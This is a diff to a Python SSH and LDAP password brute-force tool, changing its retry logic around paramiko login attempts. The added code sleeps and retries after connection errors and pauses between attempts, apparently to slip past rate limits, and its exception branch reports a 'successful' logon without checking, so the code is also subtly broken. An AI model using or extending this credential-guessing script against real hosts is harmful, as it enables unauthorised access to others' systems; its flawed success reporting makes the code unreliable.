@@ -6,7 +6,7 @@ import os
 import subprocess
 import ipaddress
 import paramiko
-from tenacity import retry,stop
+import time
 from tqdm import tqdm
 
 
@@ -33,7 +33,6 @@ class Brute:
             for i in fh.readlines():
                 self.passwords.append(i.rstrip('\r\n'))
 
-    @retry(stop=stop.stop_after_attempt(15))
     def _brute_ssh(self):    # Cycle through users and passwords and test SSH logon
         print("[*] Beginning SSH Brute Force: ")
         client = paramiko.client.SSHClient()
@@ -54,6 +53,10 @@ class Brute:
                         tqdm.write(f"[*] Logon failed for {i}:{j}")
                     else:
                         continue
+                except (paramiko.SSHException, paramiko.ssh_exception.SSHException, EOFError, OSError):
+                    time.sleep(60)
+                    client.connect(self.target, username=i, password=j, banner_timeout=20)
+                    tqdm.write(f"[*] Logon Successfful for {i}:{j}")
                 except KeyboardInterrupt:
                     tqdm.write("Exiting...")
                     exit(0)
@@ -61,7 +64,14 @@ class Brute:
                     print(e)
                     tqdm.write("An Error Occured, ensure the host is reachable")
                     exit(1)
-                client.close()
+                finally:
+                    try:
+                        client.close()
+                        time.sleep(10)
+                    except:
+                        time.sleep(10)
+                        continue
+
     
     def _brute_ldap(self):   # Cycle through users and passwords and test LDAP bind
         print("[*] Beginning LDAP Brute Force: ")
